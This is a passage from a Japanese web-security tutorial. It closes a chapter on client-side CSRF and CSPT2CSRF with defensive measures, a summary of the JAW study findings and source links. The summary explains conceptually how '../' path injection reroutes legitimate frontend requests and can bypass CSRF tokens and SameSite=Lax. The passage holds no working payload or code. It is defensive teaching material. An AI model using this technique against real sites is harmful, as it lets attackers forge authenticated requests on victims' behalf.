5. **CSP（Content Security Policy）** で `connect-src` を絞り、意図しない宛先への `fetch`/`XHR` を抑止する（多層防御）。
6. **DOM Clobbering 対策**: グローバル変数を DOM 要素で上書きされない書き方（`window.x` に頼らない、`Object.freeze`、明示的な型チェック）を徹底する。

要するに、`SameSite` や CSRF トークンといった「サーバ側 CSRF 対策」は client-side CSRF / CSPT2CSRF には効かないことを前提に、**クライアント側のデータフロー（source→sink）を断つ**設計が本質的な防御になる。

> 出典: JAW GitHub — https://github.com/SoheilKhodayari/JAW ／ PayloadsAllTheThings — Client Side Path Traversal — https://swisskyrepo.github.io/PayloadsAllTheThings/Client%20Side%20Path%20Traversal/

---

### まとめ

- 古典的 CSRF が `SameSite` 等で封じられても、攻撃の起点はクライアント側 JavaScript へ移った。リクエストを送るのがページ自身の正規コードである以上、Cookie は自動付与され、`SameSite` やトークンは前提から崩れる。
- **client-side CSRF**（JAW, USENIX Sec 2021）は、`window.location`・`postMessage` 等の **source** から `fetch`・`XHR` 等の **sink** へ攻撃者データが到達し、偽造可能リクエストが生まれる問題。106 アプリ / 2.28 億行の解析で 87 アプリに脆弱性、12,701 件の偽造可能リクエスト、203 件が悪用可能という規模で実在が示された。
- **CSPT2CSRF**（Doyensec, 2024）は、フロントエンドが組む API パスに `../` を注入して正規リクエストを別エンドポイントへ再ルーティングする実務的手口。POST/PATCH/DELETE でも成立し、CSRF トークンと `SameSite=Lax` を回避しうる。攻撃者が握るのは原則「パスのみ」という制約が攻防の鍵。
- 防御は一貫して「クライアント側の source→sink を断つ」こと。入力の出所を信用せず、パスを安全に組み立て（`encodeURIComponent`・allowlist）、`postMessage` の origin を検証し、CSP で宛先を絞る。


---

## ナビゲーション

[← 第3章 CSRFトークン・防御ロジックのバイパス](03-token-bypass.md)　｜　[📚 目次（ホーム）](index.md)　｜　[第5章 前提 — SOPとCORSの仕組み →](05-cors-fundamentals.md)
